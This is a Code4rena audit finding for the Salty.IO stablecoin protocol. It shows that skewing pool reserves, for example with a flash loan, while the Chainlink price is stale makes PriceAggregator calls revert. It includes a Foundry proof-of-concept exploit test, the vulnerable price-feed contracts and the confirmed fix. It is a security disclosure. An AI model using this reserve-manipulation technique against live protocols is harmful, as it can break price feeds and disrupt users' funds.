{
  "Title": "[M-15] Attacker can take advantage of Chainlink price not occuring within it's 60 minute heartbeat to make PriceAggregator calls fail",
  "Content": "\n<https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreChainlinkFeed.sol#L45> \n\n<https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreSaltyFeed.sol#L34> \n\n<https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreSaltyFeed.sol#L47>\n\nSalty.IO relies on three default price feeds to get the price of BTC and ETH for the price of the collateral backing USDS. In the `CoreChainlinkFeed` contract, a price of 0 is returned when the Chainlink price update has not occurred within it's 60 minute heartbeat. When this happens, the other two price feeds being the Uniswap V3 TWAP and the Salty.IO Reserves would provide the necessary price feed data. However, using the reserves of a liquidity pool directly for price data is dangerous as a user can skew the ratio of the tokens in the pool by simply swapping one for the other. This issue becomes more concerning when flash loans are involved, giving anyone a large amount of tokens temporarily to significantly skew the ratio of the pool. This means that when the Chainlink price update has not occurred within it's 60 minute heartbeat, an attacker can skew the ratio of the Salty.IO Reserves and artificially change the price of BTC or ETH in their respective pools paired with USDS. This will inevitably make the `PriceAggregator` contract revert when price data is needed (because there are two non zero price feeds and the difference between these prices is too large).\n\n### Proof of Concept\n\nThis is part of the `CoreChainlinkFeed.latestChainlinkPrice()` function which returns the price of a token in a given Chainlink price feed:\n\n<details>\n\n```solidity\ntry chainlinkFeed.latestRoundData()\nreturns (\n  uint80, // _roundID\n  int256 _price,\n  uint256, // _startedAt\n  uint256 _answerTimestamp,\n  uint80 // _answeredInRound\n)\n  {\n  // Make sure that the Chainlink price update has occurred within its 60 minute heartbeat\n  // https://docs.chain.link/data-feeds#check-the-timestamp-of-the-latest-answer\n  uint256 answerDelay = block.timestamp - _answerTimestamp;\n\n  if ( answerDelay <= MAX_ANSWER_DELAY )\n    price = _price;\n  else\n    price = 0;\n  }\ncatch (bytes memory) // Catching any failure\n  {\n  // In case of failure, price will remain 0\n  }\n```\n</details>\n\nThese are both functions of the `CoreSaltyFeed` contract which return the price of BTC and ETH based on the reserves of their respective pools paired with USDS:\n\n<details>\n\n```solidity\n// Returns zero for an invalid price\nfunction getPriceBTC() external view returns (uint256)\n  {\n      (uint256 reservesWBTC, uint256 reservesUSDS) = pools.getPoolReserves(wbtc, usds); // @audit-issue Pool reserves can be skewed by someone with enough tokens. Maybe TWAP is better here\n\n  if ( ( reservesWBTC < PoolUtils.DUST ) || ( reservesUSDS < PoolUtils.DUST ) )\n    return 0;\n\n  // reservesWBTC has 8 decimals, keep the 18 decimals of reservesUSDS\n  // @audit-ok Math checks out\n  return ( reservesUSDS * 10**8 ) / reservesWBTC;\n  }\n\n\n// Returns zero for an invalid price\nfunction getPriceETH() external view returns (uint256)\n  {\n      (uint256 reservesWETH, uint256 reservesUSDS) = pools.getPoolReserves(weth, usds); // @audit-info Pool reserves can be skewed by someone with enough tokens. Maybe TWAP is better here. Same as above.\n\n  if ( ( reservesWETH < PoolUtils.DUST ) || ( reservesUSDS < PoolUtils.DUST ) )\n    return 0;\n\n  // @audit-ok Math checks out\n  return ( reservesUSDS * 10**18 ) / reservesWETH;\n  }\n  }\n```\n</details>\n\nAs can be seen, the `CoreSaltyFeed` contract relies on the reserves of the WBTC/USDS and WETH/USDS pool. This is dangerous as the ratios of the pools can easily be skewed by an attacker with enough tokens.\n\nClone the github repo and run `forge build` then paste the following test file in `/src/scenario_tests/` and run `forge test --mt test_exploitChainlinkLongHeartbeatPOC`:\n\n<details>\n  <summary>POC Test File</summary>\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity =0.8.22;\n\nimport \"../dev/Deployment.sol\";\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\nimport \"../rewards/RewardsConfig.sol\";\nimport \"../staking/StakingConfig.sol\";\nimport \"../price_feed/tests/ForcedPriceFeed.sol\";\nimport \"../price_feed/CoreSaltyFeed.sol\";\nimport \"../price_feed/CoreChainlinkFeed.sol\";\n\ncontract MockAccessManager {\n    function walletHasAccess(address wallet) external pure returns (bool) {\n        return wallet == wallet;\n    }\n}\n\ncontract MockInitialDistribution {\n    address public bootstrapBallot;\n\n    constructor(address _bootstrapBallot) {\n        bootstrapBallot = _bootstrapBallot;\n    }\n}\n\n// Mock contract to imitate when chainlink price doesn't occur within its 60 minute heartbeat\ncontract MockAggregatorV3Interface {\n    function latestRoundData()\n        external\n        pure\n        returns (uint80, int256, uint256, uint256, uint80)\n    {\n        return (0, 0, 0, 0, 0);\n    }\n}\n\ncontract ExploitChainlinkLongHeartbeatPOC is Test {\n    using SafeERC20 for ISalt;\n    using SafeERC20 for IERC20;\n\n    IExchangeConfig public exchangeConfig;\n    IBootstrapBallot public bootstrapBallot;\n    IAirdrop public airdrop;\n    IStaking public staking;\n    IDAO public dao;\n    ILiquidizer public liquidizer;\n\n    IPoolsConfig public poolsConfig;\n    IStakingConfig public stakingConfig;\n    IRewardsConfig public rewardsConfig;\n    IStableConfig public stableConfig;\n    ISaltRewards public saltRewards;\n    IPools public pools;\n    MockInitialDistribution public initialDistribution;\n\n    IRewardsEmitter public stakingRewardsEmitter;\n    IRewardsEmitter public liquidityRewardsEmitter;\n    IEmissions public emissions;\n\n    ISalt public salt;\n    IERC20 public dai;\n    USDS public usds;\n    IERC20 public wbtc;\n    IERC20 public weth;\n\n    CollateralAndLiquidity public collateralAndLiquidity;\n    MockAccessManager public accessManager;\n\n    IPriceFeed public priceFeed1;\n    IPriceFeed public priceFeed2;\n    IForcedPriceFeed public priceFeed3;\n\n    IPriceAggregator public priceAggregator;\n    IUpkeep public upkeep;\n    IDAOConfig public daoConfig;\n\n    function setUp() public {\n        vm.startPrank(address(1));\n        salt = new Salt();\n        dai = new TestERC20(\"DAI\", 18);\n        weth = new TestERC20(\"WETH\", 18);\n        wbtc = new TestERC20(\"WBTC\", 8);\n        usds = new USDS();\n\n        rewardsConfig = new RewardsConfig();\n        poolsConfig = new PoolsConfig();\n        stakingConfig = new StakingConfig();\n        stableConfig = new StableConfig();\n        daoConfig = new DAOConfig();\n\n        exchangeConfig = new ExchangeConfig(\n            salt,\n            wbtc,\n            weth,\n            dai,\n            usds,\n            IManagedWallet(address(0))\n        );\n\n        stakingRewardsEmitter = new RewardsEmitter(\n            IStakingRewards(makeAddr(\"stakingRewards\")),\n            exchangeConfig,\n            poolsConfig,\n            IRewardsConfig(address(0)),\n            false\n        );\n\n        liquidityRewardsEmitter = new RewardsEmitter(\n            IStakingRewards(makeAddr(\"stakingRewards\")),\n            exchangeConfig,\n            poolsConfig,\n            IRewardsConfig(address(0)),\n            true\n        );\n\n        pools = new Pools(exchangeConfig, poolsConfig);\n\n        MockAggregatorV3Interface CHAINLINK_BTC_USD = new MockAggregatorV3Interface();\n        MockAggregatorV3Interface CHAINLINK_ETH_USD = new MockAggregatorV3Interface();\n\n        priceFeed1 = new CoreChainlinkFeed(\n            address(CHAINLINK_BTC_USD),\n            address(CHAINLINK_ETH_USD)\n        );\n        priceFeed2 = new CoreSaltyFeed(pools, exchangeConfig);\n        priceFeed3 = new ForcedPriceFeed(30000 ether, 3000 ether);\n\n        priceAggregator = new PriceAggregator();\n        priceAggregator.setInitialFeeds(\n            IPriceFeed(address(priceFeed1)),\n            IPriceFeed(address(priceFeed2)),\n            IPriceFeed(address(priceFeed3))\n        );\n\n        saltRewards = new SaltRewards(\n            stakingRewardsEmitter,\n            liquidityRewardsEmitter,\n            exchangeConfig,\n            rewardsConfig\n        );\n\n        initialDistribution = new MockInitialDistribution(\n            makeAddr(\"bootstrapBallot\")\n        );\n\n        poolsConfig.whitelistPool(pools, salt, wbtc);\n        poolsConfig.whitelistPool(pools, salt, weth);\n        poolsConfig.whitelistPool(pools, salt, usds);\n        poolsConfig.whitelistPool(pools, wbtc, usds);\n        poolsConfig.whitelistPool(pools, weth, usds);\n        poolsConfig.whitelistPool(pools, wbtc, dai);\n        poolsConfig.whitelistPool(pools, weth, dai);\n        poolsConfig.whitelistPool(pools, usds, dai);\n        poolsConfig.whitelistPool(pools, wbtc, weth);\n\n        liquidizer = new Liquidizer(exchangeConfig, poolsConfig);\n\n        accessManager = new MockAccessManager();\n        exchangeConfig.setAccessManager(IAccessManager(address(accessManager)));\n\n        collateralAndLiquidity = new CollateralAndLiquidity(\n            pools,\n            exchangeConfig,\n            poolsConfig,\n            stakingConfig,\n            stableConfig,\n            priceAggregator,\n            liquidizer\n        );\n\n        usds.setCollateralAndLiquidity(collateralAndLiquidity);\n\n        dao = new DAO(\n            pools,\n            IProposals(address(0)),\n            exchangeConfig,\n            poolsConfig,\n            IStakingConfig(address(0)),\n            IRewardsConfig(address(0)),\n            IStableConfig(address(0)),\n            IDAOConfig(address(0)),\n            IPriceAggregator(address(0)),\n            liquidityRewardsEmitter,\n            ICollateralAndLiquidity(address(collateralAndLiquidity))\n        );\n\n        pools.setContracts(dao, collateralAndLiquidity);\n\n        liquidizer.setContracts(collateralAndLiquidity, pools, dao);\n\n        vm.stopPrank();\n\n        vm.startPrank(address(1));\n        upkeep = new Upkeep(\n            pools,\n            exchangeConfig,\n            poolsConfig,\n            daoConfig,\n            stableConfig,\n            priceAggregator,\n            saltRewards,\n            collateralAndLiquidity,\n            emissions,\n            dao\n        );\n        exchangeConfig.setContracts(\n            dao,\n            upkeep,\n            IInitialDistribution(address(initialDistribution)),\n            IAirdrop(address(0)),\n            VestingWallet(payable(address(0))),\n            VestingWallet(payable(address(0)))\n        );\n        vm.stopPrank();\n\n        vm.prank(makeAddr(\"bootstrapBallot\"));\n        pools.startExchangeApproved();\n\n        vm.prank(address(collateralAndLiquidity));\n        usds.mintTo(address(1), 60_000 ether);\n\n        vm.startPrank(address(1));\n        wbtc.approve(address(collateralAndLiquidity), 1 * 10 ** 8);\n        weth.approve(address(collateralAndLiquidity), 100 * 10 ** 18);\n        usds.approve(address(collateralAndLiquidity), 60_000 ether);\n        collateralAndLiquidity.depositLiquidityAndIncreaseShare(\n            wbtc,\n            usds,\n            1 * 10 ** 8,\n            30_000 ether,\n            0,\n            block.timestamp,\n            false\n        );\n        collateralAndLiquidity.depositLiquidityAndIncreaseShare(\n            weth,\n            usds,\n            10 * 10 ** 18,\n            30_000 ether,\n            0,\n            block.timestamp,\n            false\n        );\n        vm.stopPrank();\n    }\n\n    function test_exploitChainlinkLongHeartbeatPOC() external {\n        address alice = makeAddr(\"alice\");\n\n        // Initial price is fine as it is using uniswap v3 twap and salty pool as price feed\n        uint256 priceBTC = priceAggregator.getPriceBTC();\n        uint256 priceETH = priceAggregator.getPriceETH();\n        console.log(priceBTC);\n        console.log(priceETH);\n\n        vm.prank(address(1));\n        wbtc.safeTransfer(alice, 0.5 * 10 ** 8);\n\n        vm.startPrank(alice);\n        wbtc.approve(address(pools), 0.5 * 10 ** 8);\n\n        // Swapping WBTC to USDS skews the ratios in the pool making the price of WBTC differ from the uniswap v3 price therefore making the priceAggregator return 0 for the price of BTC\n        pools.depositSwapWithdraw(\n            wbtc,\n            usds,\n            0.5 * 10 ** 8,\n            0,\n            block.timestamp\n        );\n        vm.stopPrank();\n\n        vm.prank(address(1));\n        weth.safeTransfer(alice, 5 * 10 ** 18);\n\n        vm.startPrank(alice);\n        weth.approve(address(pools), 5 * 10 ** 18);\n\n        // Swapping WETH to USDS skews the ratios in the pool making the price of WETH differ from the uniswap v3 price therefore making the priceAggregator return 0 for the price of ETH\n        pools.depositSwapWithdraw(weth, usds, 5 * 10 ** 18, 0, block.timestamp);\n        vm.stopPrank();\n\n        // Getting price data now fails\n        vm.expectRevert();\n        priceAggregator.getPriceBTC();\n        vm.expectRevert();\n        priceAggregator.getPriceETH();\n    }\n}\n```\n\n</details>\n\nAs can be seen, because the `CoreChainlinkFeed` contract has returned a price of 0, the `PriceAggregator` contract is left to rely on the other two price feeds, including the Salty.IO Reserves. However, an attacker can make calls for price data to `PriceAggregator` fail by skewing the ratios of the WBTC/USDS and WETH/USDS pool, making the prices of the two price feeds deviate from each other above the allowed threshold.\n\n### Recommended Mitigation Steps\n\nA TWAP for the Salty.IO Reserves would be recommended to smooth off any significant price movement and decrease the chance of there being a significant deviation from the real world price.\n\n**[Picodes (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/486#issuecomment-1952277436):**\n > Medium severity is appropriate as a protocol's functionality is broken but the reports doesn't show how to extract funds using this.\n\n**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/486#issuecomment-1953431903):**\n > Chainlink timeout now set to 65 minutes:\n> \n> https://github.com/othernet-global/salty-io/commit/f9a830c61e77a22722a8e674a8affabe2a0cf04a\n\n > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:\n> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9\n\n\n**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/18), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/98), and [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/80).\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2024-01-salty",
  "Code": [
    {
      "filename": "src/price_feed/CoreChainlinkFeed.sol",
      "content": "// SPDX-License-Identifier: BUSL 1.1\npragma solidity =0.8.22;\n\nimport \"chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\nimport \"./interfaces/IPriceFeed.sol\";\n\n\n// Uses Chainlink price oracles to retrieve prices for BTC and ETH.\n// Prices are returned with 18 decimals.\ncontract CoreChainlinkFeed is IPriceFeed\n    {\n    uint256 constant MAX_ANSWER_DELAY = 60 minutes;\n\n\t// https://docs.chain.link/data-feeds/price-feeds/addresses\n\tAggregatorV3Interface immutable public CHAINLINK_BTC_USD;\n    AggregatorV3Interface immutable public CHAINLINK_ETH_USD;\n\n\n\tconstructor( address _CHAINLINK_BTC_USD, address _CHAINLINK_ETH_USD )\n\t\t{\n\t\tCHAINLINK_BTC_USD = AggregatorV3Interface(_CHAINLINK_BTC_USD);\n\t\tCHAINLINK_ETH_USD = AggregatorV3Interface(_CHAINLINK_ETH_USD);\n\t\t}\n\n\n\t// Returns a Chainlink oracle price with 18 decimals (converted from Chainlink's 8 decimals).\n\t// Returns zero on any type of failure.\n\tfunction latestChainlinkPrice(AggregatorV3Interface chainlinkFeed) public view returns (uint256)\n\t\t{\n\t\tint256 price = 0;\n\n\t\ttry chainlinkFeed.latestRoundData()\n\t\treturns (\n\t\t\tuint80, // _roundID\n\t\t\tint256 _price,\n\t\t\tuint256, // _startedAt\n\t\t\tuint256 _answerTimestamp,\n\t\t\tuint80 // _answeredInRound\n\t\t)\n\t\t\t{\n\t\t\t// Make sure that the Chainlink price update has occurred within its 60 minute heartbeat\n\t\t\t// https://docs.chain.link/data-feeds#check-the-timestamp-of-the-latest-answer\n\t\t\tuint256 answerDelay = block.timestamp - _answerTimestamp;\n\n\t\t\tif ( answerDelay <= MAX_ANSWER_DELAY )\n\t\t\t\tprice = _price;\n\t\t\telse\n\t\t\t\tprice = 0;\n\t\t\t}\n\t\tcatch (bytes memory) // Catching any failure\n\t\t\t{\n\t\t\t// In case of failure, price will remain 0\n\t\t\t}\n\n\t\tif ( price < 0 )\n\t\t\treturn 0;\n\n\t\t// Convert the 8 decimals from the Chainlink price to 18 decimals\n\t\treturn uint256(price) * 10**10;\n\t\t}\n\n\n\tfunction getPriceBTC() external view returns (uint256)\n\t\t{\n\t\treturn latestChainlinkPrice( CHAINLINK_BTC_USD );\n\t\t}\n\n\n\tfunction getPriceETH() external view returns (uint256)\n\t\t{\n\t\treturn latestChainlinkPrice( CHAINLINK_ETH_USD );\n\t\t}\n    }"
    },
    {
      "filename": "src/price_feed/CoreSaltyFeed.sol",
      "content": "// SPDX-License-Identifier: BUSL 1.1\npragma solidity =0.8.22;\n\nimport \"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\nimport \"../interfaces/IExchangeConfig.sol\";\nimport \"../pools/interfaces/IPools.sol\";\nimport \"./interfaces/IPriceFeed.sol\";\nimport \"../pools/PoolUtils.sol\";\n\n\n// Uses the Salty.IO pools to retrieve prices for BTC and ETH.\n// Prices are returned with 18 decimals.\ncontract CoreSaltyFeed is IPriceFeed\n    {\n    IPools immutable public pools;\n\n\tIERC20 immutable public wbtc;\n\tIERC20 immutable public weth;\n\tIERC20 immutable public usds;\n\n\n\tconstructor( IPools _pools, IExchangeConfig _exchangeConfig )\n\t\t{\n\t\tpools = _pools;\n\t\twbtc = _exchangeConfig.wbtc();\n\t\tweth = _exchangeConfig.weth();\n\t\tusds = _exchangeConfig.usds();\n\t\t}\n\n\n\t// Returns zero for an invalid price\n\tfunction getPriceBTC() external view returns (uint256)\n\t\t{\n        (uint256 reservesWBTC, uint256 reservesUSDS) = pools.getPoolReserves(wbtc, usds);\n\n\t\tif ( ( reservesWBTC < PoolUtils.DUST ) || ( reservesUSDS < PoolUtils.DUST ) )\n\t\t\treturn 0;\n\n\t\t// reservesWBTC has 8 decimals, keep the 18 decimals of reservesUSDS\n\t\treturn ( reservesUSDS * 10**8 ) / reservesWBTC;\n\t\t}\n\n\n\t// Returns zero for an invalid price\n\tfunction getPriceETH() external view returns (uint256)\n\t\t{\n        (uint256 reservesWETH, uint256 reservesUSDS) = pools.getPoolReserves(weth, usds);\n\n\t\tif ( ( reservesWETH < PoolUtils.DUST ) || ( reservesUSDS < PoolUtils.DUST ) )\n\t\t\treturn 0;\n\n\t\treturn ( reservesUSDS * 10**18 ) / reservesWETH;\n\t\t}\n    }"
    },
    {
      "filename": "src/price_feed/CoreSaltyFeed.sol",
      "content": "// SPDX-License-Identifier: BUSL 1.1\npragma solidity =0.8.22;\n\nimport \"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\nimport \"../interfaces/IExchangeConfig.sol\";\nimport \"../pools/interfaces/IPools.sol\";\nimport \"./interfaces/IPriceFeed.sol\";\nimport \"../pools/PoolUtils.sol\";\n\n\n// Uses the Salty.IO pools to retrieve prices for BTC and ETH.\n// Prices are returned with 18 decimals.\ncontract CoreSaltyFeed is IPriceFeed\n    {\n    IPools immutable public pools;\n\n\tIERC20 immutable public wbtc;\n\tIERC20 immutable public weth;\n\tIERC20 immutable public usds;\n\n\n\tconstructor( IPools _pools, IExchangeConfig _exchangeConfig )\n\t\t{\n\t\tpools = _pools;\n\t\twbtc = _exchangeConfig.wbtc();\n\t\tweth = _exchangeConfig.weth();\n\t\tusds = _exchangeConfig.usds();\n\t\t}\n\n\n\t// Returns zero for an invalid price\n\tfunction getPriceBTC() external view returns (uint256)\n\t\t{\n        (uint256 reservesWBTC, uint256 reservesUSDS) = pools.getPoolReserves(wbtc, usds);\n\n\t\tif ( ( reservesWBTC < PoolUtils.DUST ) || ( reservesUSDS < PoolUtils.DUST ) )\n\t\t\treturn 0;\n\n\t\t// reservesWBTC has 8 decimals, keep the 18 decimals of reservesUSDS\n\t\treturn ( reservesUSDS * 10**8 ) / reservesWBTC;\n\t\t}\n\n\n\t// Returns zero for an invalid price\n\tfunction getPriceETH() external view returns (uint256)\n\t\t{\n        (uint256 reservesWETH, uint256 reservesUSDS) = pools.getPoolReserves(weth, usds);\n\n\t\tif ( ( reservesWETH < PoolUtils.DUST ) || ( reservesUSDS < PoolUtils.DUST ) )\n\t\t\treturn 0;\n\n\t\treturn ( reservesUSDS * 10**18 ) / reservesWETH;\n\t\t}\n    }"
    }
  ]
}